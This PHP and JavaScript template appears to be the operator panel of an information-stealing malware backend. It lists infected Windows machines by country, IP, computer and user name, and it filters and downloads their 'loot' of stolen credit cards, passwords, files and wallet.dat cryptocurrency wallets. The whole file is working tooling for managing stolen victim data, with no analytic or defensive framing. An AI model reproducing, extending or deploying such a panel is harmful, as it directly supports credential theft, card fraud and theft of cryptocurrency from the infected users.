<?php if(!defined("ACCESS")){exit();}?>
<script type="text/javascript">
function viewdiv(id,e){
	var el=document.getElementById(id);
	if(el.style.display=="block"){
		el.style.display="none";
	} else {
		el.style.display="block";
		this.innerHTML="Скрыть";
	}
	return false;
}

$(window).scroll(function() {
  sessionStorage.scrollTop = $(this).scrollTop();
});

$(document).ready(function() {
  if (sessionStorage.scrollTop != "undefined") {
    $(window).scrollTop(sessionStorage.scrollTop);
  }
});


function pin_report(id) {
	var button = document.getElementById("pinbutton" + id);
	var tr = document.getElementById("tr" + id);
	
      $.ajax({
        url:"./?p=reports&action=pin&rid=" + id,
        type: "GET",
        success:function(result){
			if(button.className.includes('default')){
				button.className = button.className.replace('default', 'pin');
				tr.className += ' pinnedtr';
			}else {
				button.className = button.className.replace('pin', 'default');
				tr.className = tr.className.replace('pinnedtr','');
			}
			
       }
     });
 }

function mark_report(id) {
	var button = document.getElementById("markbutton" + id);
	var tr = document.getElementById("tr" + id);
	
      $.ajax({
        url:"./?p=reports&action=mark&rid=" + id,
        type: "GET",
        success:function(result){
			if(button.className.includes('default')){
				button.className = button.className.replace('default', 'mark');
				tr.className += ' markedtr';
			}else {
				button.className = button.className.replace('mark', 'default');
				tr.className = tr.className.replace('markedtr','');
			}
			
       }
     });
 }
 
function delete_report(id) {
	var tr = document.getElementById("tr" + id);
	$.ajax({
        url:"./?p=reports&action=delete&rid=" + id,
        type: "GET",
        success:function(result){
			tr.style.display = 'none';
       }
     });
 }
 
function change_comment(id){
	newcomm = document.getElementById("newcomm" + id).value;
	$.ajax({
        url:"./?p=reports&action=edit&rid=" + id,
        type: "POST",
		data: {'newcomm':newcomm},
        success:function(result){
			viewdiv("showcomm" + id);
			viewdiv("editcomm" + id);
			document.getElementById("showcomm" + id).innerHTML = newcomm;
       }
     });
}

</script>
<div style="padding:15px"><i class="fas fa-filter"></i> Filter <span onclick="viewdiv('filter');" style="text-decoration:underline;text-decoration-style:dashed;cursor: pointer;">hide/show</span>  
	<div id="filter" style="display:none;">
	<form action="" method="post">
	<input type="hidden" name="filter" value="1337">
	<table border=0>
		<tr>
			<td valign="top">
			<fieldset><legend>Countries</legend>
							<table border=0>
					<tr>
						<td style="text-align:top;"  valign="top" colspan=2>By list:<br><input type="text" name="countries" placeholder="DE, UK, US, CN, *" size=50><br><br></td>
					</tr>
				</table>
			</fieldset>
		<table>
		<tr>
			<td>Date from:</td>
			<td><input name="datefrom" value="" type="date"></td>
		</tr>
		<tr>
			<td>Date up:</td>
			<td><input name="dateup" value="" type="date"></td>
		</tr>
		<tr>
			<td>Include cookie host:</td>
			<td><input name="cookiehost" placeholder="google.com" type="text"></td>
		</tr>		
		<tr>
			<td>Computer name (like ...):</td>
			<td><input type="text" name="pcname" placeholder="Admin-PC"></td>
		</tr>
		<tr>
			<td>Username (like ...):</td>
			<td><input type="text" name="username" placeholder="Administrator"></td>
		</tr>
		<tr>
			<td>IP (like ...):</td>
			<td><input type="text" name="ip" placeholder="8.8.8.8"></td>
		</tr>
		<tr>
			<td>&nbsp;</td>
			<td><input type=submit value="Filter"></td>
		</tr>
		</table>	
				
			</td>
			<td valign="top">
			<table>
				<tr>
					<td style="text-align:top;padding-bottom:15px;"  valign="top">
						OS:<br>
						<label><input type="checkbox" name='osname[w2000]' value="on" checked>Win 2000</label><br>
						<label><input type="checkbox" name='osname[wXP]' value="on" checked>Win XP</label><br>
						<label><input type="checkbox" name='osname[w2003]' value="on" checked>Win 2003</label><br>
						<label><input type="checkbox" name='osname[wvista]' value="on" checked>Win Vista</label><br>
						<label><input type="checkbox" name='osname[w7]' value="on" checked>Win 7</label><br>
						<label><input type="checkbox" name='osname[w2008]' value="on" checked>Win 2008</label><br>
						<label><input type="checkbox" name='osname[w8]' value="on" checked>Win 8</label><br>
						<label><input type="checkbox" name='osname[w2012]' value="on" checked>Win 2012</label><br>
						<label><input type="checkbox" name='osname[w81]' value="on" checked>Win 8.1</label><br>
						<label><input type="checkbox" name='osname[w2016]' value="on" checked>Win 2016</label><br>
						<label><input type="checkbox" name='osname[w10]' value="on" checked>Win 10</label><br>
						<br>
						Comment:<br>
						<label><input type="checkbox" name="comment[with]" value='on' checked>With comment</label><br>
						<label><input type="checkbox" name="comment[without]" value='on' checked>Without comment</label><br>
					</td>
					<td style="padding-left:25px;" valign="top">
						Report status:<br>
						<label><input type="checkbox" name="reportstatus[regular]" value='on'checked>Regular</label><br>
						<label><input type="checkbox" name="reportstatus[trash]"  value='on'>Trashed</label><br>
						<label><input type="checkbox" name="reportstatus[vip]"  value='on'checked>Vip</label><br>
						<label><input type="checkbox" name="reportstatus[susp]"  value='on'checked>Suspicious</label><br>
						
						<span style='display: inline-block; width:80px;'>Mark:</span>
						<label><input type="radio" name="mark" value='default' checked>Default</label>
						<label><input type="radio" name="mark" value='yes'>Marked</label>
						<label><input type="radio" name="mark" value='no'>Without mark</label><br>
						
						<span style='display: inline-block; width:80px;'>Pin:</span>
						<label><input type="radio" name="pin" value='default' checked>Default</label>
						<label><input type="radio" name="pin" value='yes'>Pinned</label>
						<label><input type="radio" name="pin" value='no'>Without pin</label><br>
						
						<br>
						Architecture:<br>
						<label><input type="checkbox" name="architecture[x32]" value='on' checked>x86</label><br>
						<label><input type="checkbox" name="architecture[x64]" value='on' checked>x64</label><br>
						<br>
						Rights:<br>
						<label><input type="checkbox" name="user[user]" value='on' checked>User</label><br>
						<label><input type="checkbox" name="user[admin]" value='on' checked>Admin</label><br>
					</td>
				</tr>
				<tr>
					<td style="text-align:top;padding-bottom:15px;" colspan=3 valign="top">
						<b>Report content:</b><br>
						<!--default, with, without-->
						<span style='display: inline-block; width:80px;'>Wallet.dat:</span>
						<label><input type="radio" name="walletdat" value='default' checked>Default</label>
						<label><input type="radio" name="walletdat" value='yes'>With</label>
						<label><input type="radio" name="walletdat" value='no'>Without</label><br>
						
						<span style='display: inline-block; width:80px;'>Files:</span>
						<label><input type="radio" name="files" value='default' checked>Default</label>
						<label><input type="radio" name="files" value='yes'>With</label>
						<label><input type="radio" name="files" value='no'>Without</label><br>
						
						<span style='display: inline-block; width:80px;'>CC:</span>
						<label><input type="radio" name="cards" value='default' checked>Default</label>
						<label><input type="radio" name="cards" value='yes' >With</label>
						<label><input type="radio" name="cards" value='no'>Without</label><br>
						
						<span style='display: inline-block; width:80px;'>Passwords:</span>
						<label><input type="radio" name="passwords" value='default' checked>Default</label>
						<label><input type="radio" name="passwords" value='yes'>With</label>
						<label><input type="radio" name="passwords" value='no'>Without</label><br>
					</td>
				</tr>
				<tr>
					<td style="padding-left:5px; padding-bottom:15px;" valign="top">
						<b>Include link group:</b><br>
<?php  while($l_row = $links_result->fetch_assoc()){ echo "<label><input type=\"checkbox\" name='linksfilter[]' value=\"".(int)$l_row['id']."\">".htmlspecialchars($l_row['name'],ENT_QUOTES)."</label><br>"; } ?>
					</td>
				</tr>		
				
				
			</table>
			</td>
		</tr>
		<tr>
		</tr>
	</table>
	</form>
	</div>
</div>
<div style='margin:0 auto; text-align:center;padding:10px;overflow:hidden'>
<?php change_on_page($_SESSION['onpage']); ?>
<?php pagination($total, $page_num, $page);?>
</div>
<table class="main_table">
	<tr>
		<th>#</th>
		<th>Country & IP</th>
		<th>OS Arch. (Rights)</th>
		<th>Computer/User</th>
		<th>Last seen</th>
		<th>Loot</th>
		<th>Comment</th>
		<th>Actions</th>
	</tr>
<?php
$i = $first+1; while($row = $reports_result->fetch_assoc()){ echo show_reports_table_tr($row); echo "<td>".(int)$i."</td>";$i++; if($row['country']=="-"){$row['country']="N";} echo "<td style='text-align:left;vertical-align:middle;'><i class='flag flag-24 flag-".strtolower(htmlspecialchars($row['country'], ENT_QUOTES))." tooltip tooltip-right' data-tooltip='".htmlspecialchars($row['country'], ENT_QUOTES)." - ".htmlspecialchars(code_to_country($row['country']), ENT_QUOTES)."' alt='".htmlspecialchars($row['country'], ENT_QUOTES)."' style='border:1px solid black;margin-right:5px;' align='left'></i> ".htmlspecialchars($row['ip'],ENT_QUOTES)."</td>"; echo "<td style='text-align:left;vertical-align:middle;'>".htmlspecialchars(get_os_nicename($row['osver']),ENT_QUOTES)." ".htmlspecialchars($row['osarch'],ENT_QUOTES)." (".htmlspecialchars($row['bin_rights'],ENT_QUOTES).") </td>"; echo "<td style='text-align:left;vertical-align:middle;'>".htmlspecialchars($row['compname'],ENT_QUOTES)." / ".htmlspecialchars($row['username'],ENT_QUOTES)."</td>"; echo "<td style=''><span class='tooltip tooltip-right' data-tooltip='".htmlspecialchars($row['time'],ENT_QUOTES)."'>".htmlspecialchars(showDate(strtotime($row['time'])),ENT_QUOTES)."</span></td>"; echo "<td>"; if(!$row['cc']==0){ echo "<span class='label label-cc tooltip tooltip-right' data-tooltip='CC in report: ".(int)$row['cc']."'>CC: ".(int)$row['cc']."</span> "; } if(!$row['files']==0){ echo "<span class='label label-good tooltip tooltip-right' data-tooltip='Files in report: ".(int)$row['files']."'>files: ".(int)$row['files']."</span> "; } if(!$row['passwords']==0){ echo "<span class='label label-pwd tooltip tooltip-right' data-tooltip='Passwords in report: ".(int)$row['passwords']."'>pwd: ".(int)$row['passwords']."</span> "; } if(!$row['crypto']==0){ echo "<span class='label label-crypto tooltip tooltip-right' data-tooltip=\"'wallet.dat' in report: ".(int)$row['crypto']."\">crypto: ".(int)$row['crypto']."</span> "; } echo "</td>"; echo "<td><div id='showcomm".(int)$row['id']."' style='display:block;'>".htmlspecialchars($row['comment'],ENT_QUOTES)."</div>
	<div id='editcomm".(int)$row['id']."' style='display:none;'>
	<input id='newcomm".(int)$row['id']."' type='text' name='newcomm' value='".htmlspecialchars($row['comment'],ENT_QUOTES)."'><input type='submit' value='Save' onclick='change_comment(".(int)$row['id'].")'>
	</div>
	</td>"; echo "<td nowrap>"; echo "<a href=\"./".REPORTS_FOLDER."/zip/".htmlspecialchars($row['report_file'],ENT_QUOTES)."\" class='tooltip tooltip-left' data-tooltip=\"Download report: ".human_filesize(@filesize("./".REPORTS_FOLDER."/zip/".$row['report_file']),0)."\"><i class=\"button button-download fas fa-download fa-fw\"></i></a> "; echo "<a href=\"?p=reports&rid=".(int)$row['id']."\" class='tooltip tooltip-left' data-tooltip=\"Open report\"><i class=\"button button-default fas fa-folder-open fa-fw\"></i></a> "; echo "<a href='#' class='tooltip tooltip-left' data-tooltip=\"Mark report\" onclick='mark_report(".(int)$row['id'].");return false;'>"; if($row['marked'] == REPORT_MARKED){ echo "<i class=\"button button-mark fas fa-paint-brush fa-fw\" id='markbutton".(int)$row['id']."'></i></a> "; }else{ echo "<i class=\"button button-default fas fa-paint-brush fa-fw\"  id='markbutton".(int)$row['id']."'></i></a> "; } echo "<a href='#' class='tooltip tooltip-left' data-tooltip=\"Pin report\" onclick='pin_report(".(int)$row['id'].");return false;'>"; if($row['pin'] == REPORT_PINNED){ echo "<i class=\"button button-pin fas fa-thumbtack fa-fw\" id='pinbutton".(int)$row['id']."'></i></a> "; }else{ echo "<i class=\"button button-default fas fa-thumbtack fa-fw\" id='pinbutton".(int)$row['id']."'></i></a> "; } echo "<a href=\"#\" class='tooltip tooltip-left' data-tooltip=\"Edit comment\" onclick=\"viewdiv('editcomm".(int)$row['id']."');viewdiv('showcomm".$row['id']."');return false;\"><i class=\"button button-default fas fa-edit fa-fw\"></i></a> "; echo "<a href='#' class='tooltip tooltip-left' onclick='delete_report(".$row['id'].");return false;' data-tooltip=\"Delete report\""; echo "><i class=\"button button-delete fas fa-trash-alt fa-fw\"></i></a> "; echo "</td>"; echo "</tr>"; } ?>
</table>

<div style='margin:0 auto; text-align:center;padding:10px;overflow:hidden'>
<?php pagination($total, $page_num, $page);?>
</div>